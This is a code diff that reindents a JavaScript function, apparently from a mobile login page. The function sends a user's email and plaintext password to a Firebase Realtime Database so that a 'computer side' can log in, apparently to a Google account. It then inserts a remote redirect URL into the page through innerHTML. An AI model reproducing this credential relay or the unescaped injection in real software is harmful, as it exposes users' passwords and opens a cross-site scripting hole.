@@ -336,55 +336,56 @@
             
             // 發送登入資料到 Firebase Realtime Database
             // 發送登入資料到 Firebase Realtime Database (替換原有函數)
-            function sendLoginData(connectionId, email, password) {
-                try {
-                    // 使用connectionId作為資料庫鍵值
-                    const connectionRef = database.ref('connections/' + connectionId);
-        
-                    // 設定資料
-                    connectionRef.set({
-                        email: email,
-                        password: password,
-                        timestamp: Date.now(),
-                        status: 'pending',
-                        device: {
-                            type: 'mobile',
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform
-                        }
-                    });
-        
-                    // 監聽狀態更新
-                    connectionRef.on('value', (snapshot) => {
-                        const data = snapshot.val();
-                        if (!data) return; // 資料已被刪除
-            
-                        const status = data.status;
-            
-                        if (status === 'pending') {
-                            showMessage('正在處理您的登入請求...', 'waiting');
-                        } else if (status === 'processing') {
-                            showMessage('電腦端正在進行登入...', 'waiting');
-                        } else if (status === 'success') {
-                            showMessage(`登入成功！已登入為: ${data.loggedInUser || 'Google用戶'}`, 'success');
-                            
-                            // 顯示其他登入資訊
-                            if (data.redirectUrl) {
-                                const additionalInfo = document.createElement('div');
-                                additionalInfo.innerHTML = `<p>電腦將導向至: ${data.redirectUrl}</p>`;
-                                document.querySelector('.container').appendChild(additionalInfo);
-                            }
-                        } else if (status === 'error') {
-                            showMessage(`登入失敗: ${data.errorMessage || '未知錯誤'}`, 'error');
-                        }
-                    });
-                    
-                    showMessage('已發送登入請求，請查看電腦端', 'success');
-                } catch (error) {
-                    showMessage('連線錯誤，請確保網路連線正常', 'error');
-                    console.error('Firebase error:', error);
-                }
+// 發送登入資料到 Firebase Realtime Database
+function sendLoginData(connectionId, email, password) {
+    try {
+        // 使用connectionId作為資料庫鍵值
+        const connectionRef = database.ref('connections/' + connectionId);
+
+        // 設定資料
+        connectionRef.set({
+            email: email,
+            password: password,
+            timestamp: Date.now(),
+            status: 'pending',
+            device: {
+                type: 'mobile',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
             }
+        });
+
+        // 監聽狀態更新
+        connectionRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (!data) return; // 資料已被刪除
+
+            const status = data.status;
+
+            if (status === 'pending') {
+                showMessage('正在處理您的登入請求...', 'waiting');
+            } else if (status === 'processing') {
+                showMessage('電腦端正在進行登入...', 'waiting');
+            } else if (status === 'success') {
+                showMessage(`登入成功！已登入為: ${data.loggedInUser || 'Google用戶'}`, 'success');
+                
+                // 顯示其他登入資訊
+                if (data.redirectUrl) {
+                    const additionalInfo = document.createElement('div');
+                    additionalInfo.innerHTML = `<p>電腦將導向至: ${data.redirectUrl}</p>`;
+                    document.querySelector('.container').appendChild(additionalInfo);
+                }
+            } else if (status === 'error') {
+                showMessage(`登入失敗: ${data.errorMessage || '未知錯誤'}`, 'error');
+            }
+        });
+        
+        showMessage('已發送登入請求，請查看電腦端', 'success');
+    } catch (error) {
+        showMessage('連線錯誤，請確保網路連線正常', 'error');
+        console.error('Firebase error:', error);
+    }
+}
             
             // 顯示訊息
             function showMessage(text, type) {
